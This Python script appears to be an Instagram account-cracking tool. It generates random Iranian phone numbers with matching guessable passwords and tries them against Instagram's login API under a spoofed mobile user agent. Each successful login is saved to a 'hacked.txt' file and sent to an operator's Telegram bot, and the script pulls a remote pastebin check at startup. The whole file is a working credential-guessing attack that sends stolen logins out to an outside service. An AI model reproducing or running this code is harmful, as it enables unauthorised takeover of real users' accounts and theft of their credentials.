import  os, sys, requests
skoblr = requests.get('https://pastebin.com/raw/XURh1BK6')
import os
try:
    import uuid
except:
    os.system('pip install uuid')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')

try:
    import time
except:
    os.system('pip install time')
try:
	import time 
except:
	os.system("pip install colorama")
else:
    os.system('clear')
    try:
        import pyfiglet
    except:
        os.system('pip install pyfiglet')
    else:
        os.system('clear')
        import pyfiglet, os
        from time import sleep
        import webbrowser
        Z = '\x1b[2;31m'
        G = '\x1b[1;32m'
        os.system('clear')
        bnar = pyfiglet.figlet_format('DARK_ZONE & SKOPLER ')
        print(G + bnar)
        import random, uuid, requests, string
        from user_agent import generate_user_agent
        from datetime import datetime
        from random import *
        from time import sleep
        import requests, os, random, json, threading, secrets, uuid
        from colorama import Fore, Style
        from time import sleep
        from datetime import datetime
        from secrets import token_hex
        from uuid import uuid4
        from user_agent import generate_user_agent
        from uuid import uuid4
        aa = 0
        zz = 0
        E = '\x1b[1;31m'
        G = '\x1b[1;32m'
        S = '\x1b[1;33m'
        print(E + '[' + S + '!' + E + ']' + G + '  انتضر حياتي')
        print('\n')
        ID = input(S + '[~] ID tele ==» :')
        print('\n')
        sleep(2)
        tok = input('[~] token POT ==»:')
        w = 'https://pastebin.com/raw/XURh1BK6'
        start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= استلم الحسابات اللي تجيك تم الاشراف ع الاداة من قبل دارك و سكوبلر😎").json()
        id_msg = start_msg['result']['message_id']
        rss = requests.get(w).text
        if 'skoblr' in rss:
            sleep(0.1)
        r = requests.Session()
        user = '0987654321'
        while True:
            us = str(''.join((random.choice(user) for i in range(7))))
            username = '+98916' + us
            password = '0916' + us
            url = 'https://i.instagram.com/api/v1/accounts/login/'
            headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
             'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip, deflate', 
             'Accept-Language':'en-US', 
             'X-IG-Capabilities':'3brTvw==', 
             'X-IG-Connection-Type':'WIFI', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
            uid = str(uuid4())
            data = {'uuid':uid, 
             'password':password, 
             'username':username, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
            req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
            if 'logged_in_user' in req_login.text:
                zz += 1
                print(G + 'user ==> : ' + username + ': pass==> : ' + password)
                tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=hack INSTGRAM \n user : {username}\n pass : {password}\n- - - - - - - - - - - - - - - - - - - -\n-  @DDOOVV | @Ft_r5  "
                i = requests.post(tlg)
                with open('hacked.txt', 'a') as (HACKED):
                    HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
            elif '"message":"challenge_required","challenge"' in req_login.text:
                print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
            else:
                requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= see hak 𝄮=================                                             =================️\Done hunter✅ [{zz}] \n------------------------------------------\n false hunter❌ [{aa}]  ( {username} ) \n")
                print(E + 'username ==> : ' + username 
                + ': password ==> : ' + password)
                
                aa += 1
